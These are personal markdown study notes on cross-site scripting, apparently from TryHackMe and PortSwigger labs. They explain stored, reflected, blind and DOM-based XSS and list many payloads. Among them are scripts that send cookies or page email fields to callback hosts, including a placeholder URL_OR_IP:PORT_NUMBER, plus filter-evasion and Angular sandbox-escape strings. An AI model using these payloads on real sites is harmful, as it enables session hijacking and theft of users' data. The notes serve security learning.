# XSS (Cross-Site Scripting)


- <https://portswigger.net/web-security/cross-site-scripting/cheat-sheet>
- <http://www.xss-payloads.com/>






No matter how the XSS payload is delivered and executed, the injected scripts run under the context of the user visiting the affected page. This means that the user's browser, not the web application, executes the XSS payload.

Impacts include:
- session hijacking
- forced redirection to malicious pages
- execution of local applications as that user



## Stored vs Reflected

- <https://owasp.org/www-community/Types_of_Cross-Site_Scripting>

XSS vulnerabilities can be grouped into two major classes: stored or reflected.

- Stored (or Persistent), occur when the exploit payload is stored in a database or otherwise cached by a server. The web application then retrieves this payload and displays it to anyone who visits a vulnerable page. A single Stored XSS vulnerability can therefore attack all site users.
Stored XSS vulnerabilities often exist in forum software, especially in comment sections, in product reviews, or wherever user content can be stored and reviewed later.

- Reflected XSS attacks usually include the payload in a crafted request or link. The web application takes this value and places it into the page content. This XSS variant only attacks the person submitting the request or visiting the link. Reflected XSS vulnerabilities can often occur in search fields and results, as well as anywhere user input is included in error messages.

Either of these two vulnerability variants can manifest as client (browser) or server-side.

They can also be DOM-based.

- DOM-based XSS takes place solely within the page's Document Object Model (DOM). Browsers parse a page's HTML content and then generate an internal DOM representation. This type of XSS occurs when a page's DOM is modified with user-controlled values.

DOM-based XSS can be stored or reflected. The key is that DOM-based XSS attacks occur when a browser parses the page's content and inserted JavaScript is executed.






## Identifying XSS Vulnerabilities

Identifying input fields that accept unsanitized input, which is then displayed as output on subsequent pages.

Input special characters and observe the output to determine if any of the special characters return unfiltered.

< > ' " { } ;

- HTML elements (<>)
- JS function declaration ({})
- Strings ('")
- End of statement (;)

If the application does not remove or encode these characters, it may be vulnerable to XSS because the app interprets the characters as code, which in turn, enables additional code.































## Reflected XSS
The server-side application processes data from a request and echoes the data in the response. 

User-supplied data in an HTTP request is included in the webpage source without any validation.
The JavaScript is executed because it is in the HTTP response.

Only affects the person making the web request.

```
<script>alert(window.location.hostname)</script>
<script>alert("Hello World")</script>
<script>alert(document.cookies)</script>
<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>
/images/cat.jpg" onload="alert('THM');
</textarea><script>alert('THM');</script>

# Avoid Filters
<sscriptcript>alert('THM');</sscriptcript>
```






```
// from "https://tryhackme.com/r/room/thatstheticket"
</textarea>
<script>
var i = new Image(); i.src="//TEST.1ba665d99ad23c9ad4b5a119f3a86aef.log.tryhackme.tech/?c="+document.getElementById('email').innerHTML;
</script>

</textarea>
<script>
var email = (document.getElementById('email').innerHTML).replace("@","-at-");
var my_address = "1ba665d99ad23c9ad4b5a119f3a86aef.log.tryhackme.tech";
var request = new XMLHttpRequest();
request.open("GET","http://" + email + "-musyoka-" + my_address, false); // with second parameter as 'true'(async) also works
request.send();
</script>
```





### Reflected XSS into HTML context with all tags blocked except custom ones
Payload: <custom-tag id=x onfocus=alert(document.cookie) tabindex=1>#x

<script>
location = 'https://0af9006b0401a5dc827b5bd100ca00a8.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>































## Stored XSS
Is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

Example: post comments stored in a database.


### Blind XSS
Is similar to a stored XSS in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.


Tool: <https://github.com/mandatoryprogrammer/xsshunter-express>


Examples:

`</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>`

`<a href="javascript:alert(1)">`












## DOM-based XSS
When JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as `eval()` or `innerHTML`.

The most common source for DOM XSS is the URL, which is typically accessed with the `window.location` object.

The "sinks" manipulate the DOM, and then the DOM causes the JavaScript to execute.

- document.write
`"><svg onload=alert(1)>`
`fooBar" onload="alert(1)`

- innerHTML sink using source location.search
`<img src=1 onerror=alert(1)>`
`<><img src=1 onerror=alert(1)>` Example: to bypass `.replace()` method
`<img src='0' onerror=alert(1)>`





































## PHP

### Form
this url
```
http://www.example.com/test_form.php/%22%3E%3Cscript%3Ealert('hacked')%3C/script%3E

#or

http://www.example.com/test_form.php/<script>location.href('http://www.hacked.com')</script>
```
translated to:
```
<form method="post" action="test_form.php/"><script>alert('hacked')</script>
```




### DOM XSS in jQuery anchor href attribute sink using `location.search`
```
<a id="backLink" href="/">Back</a>
<script>
	$(function() {
		$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
	});
</script>
```

original: https://example.path/feedback?returnPath=/
modified: https://example.path/feedback?returnPath=javascript:alert(document.cookie)



### escape javaScript
`';alert('THM');//`



## Angular
`{{$on.constructor('alert(1)')()}}`
`{{$eval.constructor('alert(1)')()}}`
`{{$resume.constructor('alert(1)')()}}`
- The constructor data property of an Object instance returns a reference to the constructor function that created the instance object. <https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/constructor>

Explanation:
`Function('console.log("Hello World")')(); // anonymous function made using the Function constructor`

```
function test() {
	console.log('Hello World');
}

console.log(test.constructor); // returns "Hello World"

let mySecondFunction = test.constructor('console.log("Hello World 2!")');
mySecondFunction(); // returns "Hello World 2!"
```










## SQL
Obfuscation via the SQL `CHAR()` function. Hex codes must be prefixed with `0x`.
For example, both `CHAR(83)` and `CHAR(0x53)` return the capital letter S.

Example: `SELECT` is `CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)`
